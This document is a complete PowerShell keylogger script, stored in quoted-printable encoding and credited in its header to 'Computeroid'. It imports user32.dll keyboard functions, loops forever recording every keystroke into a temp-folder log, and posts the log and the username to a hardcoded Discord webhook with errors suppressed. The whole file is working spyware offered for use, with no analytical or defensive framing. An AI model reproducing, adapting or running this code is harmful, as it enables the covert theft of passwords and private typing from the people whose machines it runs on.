#=20powershell=20keylogger
#=20created=20by=20:=20Computeroid

#=20webhook,=20CHANGE=20ME
$webhook=20=3D=20"https://discord.com/api/webhooks/1131616138724380742/aIQo=
UMIk75emzz4q-vRPolrO-gPqL8ou1Kk8kf-fx44SvEj-Ls3t9lORrh8Po-La2mQ2"

#=20write=20pid
$PID=20>=20"$env:temp/DdBPKCytRe"

#=20keylogger
function=20KeyLogger($logFile=3D"$env:temp/$env:UserName.log")=20{

=20=20#=20webhook=20process
=20=20$logs=20=3D=20Get-Content=20$logFile=20|=20Out-String
=20=20$Body=20=3D=20@{
=20=20=20=20'username'=20=3D=20$env:UserName
=20=20=20=20'content'=20=3D=20$logs
=20=20}

=20=20#=20Check=20if=20$logs=20is=20not=20empty=20before=20making=20the=20w=
ebhook=20request

=20=20$jsonBody=20=3D=20$Body=20|=20ConvertTo-Json
=20=20Write-Host=20"Sending=20JSON=20Payload:=20$logs"
=20=20Invoke-RestMethod=20-Uri=20$webhook=20-Method=20'post'=20-Body=20($Bo=
dy=20|=20ConvertTo-Json)=20-ContentType=20'Application/Json'=20-ErrorAction=
=20SilentlyContinue


=20=20#=20generate=20log=20file
=20=20$generateLog=20=3D=20New-Item=20-Path=20$logFile=20-ItemType=20File=
=20-Force

=20=20#=20API=20signatures
=20=20$APIsignatures=20=3D=20@'
[DllImport("user32.dll",=20CharSet=3DCharSet.Auto,=20ExactSpelling=3Dtrue)]
public=20static=20extern=20short=20GetAsyncKeyState(int=20virtualKeyCode);
[DllImport("user32.dll",=20CharSet=3DCharSet.Auto)]
public=20static=20extern=20int=20GetKeyboardState(byte[]=20keystate);
[DllImport("user32.dll",=20CharSet=3DCharSet.Auto)]
public=20static=20extern=20int=20MapVirtualKey(uint=20uCode,=20int=20uMapTy=
pe);
[DllImport("user32.dll",=20CharSet=3DCharSet.Auto)]
public=20static=20extern=20int=20ToUnicode(uint=20wVirtKey,=20uint=20wScanC=
ode,=20byte[]=20lpkeystate,=20System.Text.StringBuilder=20pwszBuff,=20int=
=20cchBuff,=20uint=20wFlags);
'@

=20#=20set=20up=20API
=20$API=20=3D=20Add-Type=20-MemberDefinition=20$APIsignatures=20-Name=20'Wi=
n32'=20-Namespace=20API=20-PassThru

=20#=20Create=20a=20hashtable=20mapping=20the=20virtual=20key=20codes=20to=
=20their=20names.
=20$keyMap=20=3D=20@{
=20=20=20=208=20=3D=20"<DEL>"
=20=20=20=209=20=3D=20"<TAB>"
=20=20=20=2013=20=3D=20"<ENTER>"
=20=20=20=2016=20=3D=20"<SHIFT>"
=20=20=20=2017=20=3D=20"<CTRL>"
=20=20=20=2018=20=3D=20"<ALT>"
=20=20=20=2091=20=3D=20"<WIN>"
=20=20=20=20255=20=3D=20"<NULL>"
=20}

=20=20#=20attempt=20to=20log=20keystrokes
=20=20try=20{
=20=20=20=20while=20($true)=20{
=20=20=20=20=20=20#=20Start-Sleep=20-Milliseconds=2040

=20=20=20=20=20=20for=20($ascii=20=3D=201;=20$ascii=20-le=20255;=20$ascii++=
)=20{

=20=20=20=20=20=20=20=20#=20use=20API=20to=20get=20key=20state
=20=20=20=20=20=20=20=20$keystate=20=3D=20$API::GetAsyncKeyState($ascii)

=20=20=20=20=20=20=20=20#=20use=20API=20to=20detect=20keystroke
=20=20=20=20=20=20=20=20if=20($keystate=20-eq=20-32767)=20{
=20=20=20=20=20=20=20=20=20=20$null=20=3D=20[console]::CapsLock

=20=20=20=20=20=20=20=20=20=20#=20map=20virtual=20key
=20=20=20=20=20=20=20=20=20=20$mapKey=20=3D=20$API::MapVirtualKey($ascii,=
=203)

=20=20=20=20=20=20=20=20=20=20#=20check=20if=20it's=20a=20known=20non-text=
=20key
=20=20=20=20=20=20=20=20=20=20if=20($keyMap.ContainsKey($ascii))=20{
=20=20=20=20=20=20=20=20=20=20=20=20[System.IO.File]::AppendAllText($logFil=
e,=20$keyMap[$ascii],=20[System.Text.Encoding]::Unicode)
=20=20=20=20=20=20=20=20=20=20}
=20=20=20=20=20=20=20=20=20=20else=20{
=20=20=20=20=20=20=20=20=20=20=20=20#=20create=20a=20stringbuilder
=20=20=20=20=20=20=20=20=20=20=20=20$keyboardState=20=3D=20New-Object=20Byt=
e[]=20256
=20=20=20=20=20=20=20=20=20=20=20=20$hideKeyboardState=20=3D=20$API::GetKey=
boardState($keyboardState)
=20=20=20=20=20=20=20=20=20=20=20=20$loggedchar=20=3D=20New-Object=20-TypeN=
ame=20System.Text.StringBuilder

=20=20=20=20=20=20=20=20=20=20=20=20#=20translate=20virtual=20key
=20=20=20=20=20=20=20=20=20=20=20=20if=20($API::ToUnicode($ascii,=20$mapKey=
,=20$keyboardState,=20$loggedchar,=20$loggedchar.Capacity,=200))=20{
=20=20=20=20=20=20=20=20=20=20=20=20=20=20#=20add=20logged=20key=20to=20fil=
e
=20=20=20=20=20=20=20=20=20=20=20=20=20=20[System.IO.File]::AppendAllText($=
logFile,=20$loggedchar,=20[System.Text.Encoding]::Unicode)
=20=20=20=20=20=20=20=20=20=20=20=20}
=20=20=20=20=20=20=20=20=20=20}
=20=20=20=20=20=20=20=20}
=20=20=20=20=20=20}
=20=20=20=20}
=20=20}

=20=20#=20send=20logs=20if=20code=20fails
=20=20finally=20{
=20=20=20=20#=20send=20logs=20via=20webhook
=20=20=20=20Invoke-RestMethod=20-Uri=20$webhook=20-Method=20'post'=20-Body=
=20($Body=20|=20ConvertTo-Json)=20-ContentType=20'Application/Json'=20-Erro=
rAction=20SilentlyContinue
=20=20}
}

#=20run=20keylogger
KeyLogger